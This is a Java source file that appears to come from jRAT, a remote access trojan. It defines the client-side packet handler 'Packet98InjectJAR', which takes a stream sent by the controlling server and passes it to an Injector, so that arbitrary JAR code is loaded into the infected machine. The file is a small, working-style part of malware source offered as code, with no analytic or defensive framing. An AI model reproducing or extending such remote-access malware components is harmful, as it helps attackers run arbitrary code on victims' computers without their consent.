package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.Injector;

public class Packet98InjectJAR extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Injector i = new Injector(con);
		i.inject(con.getDataInputStream());
	}

}
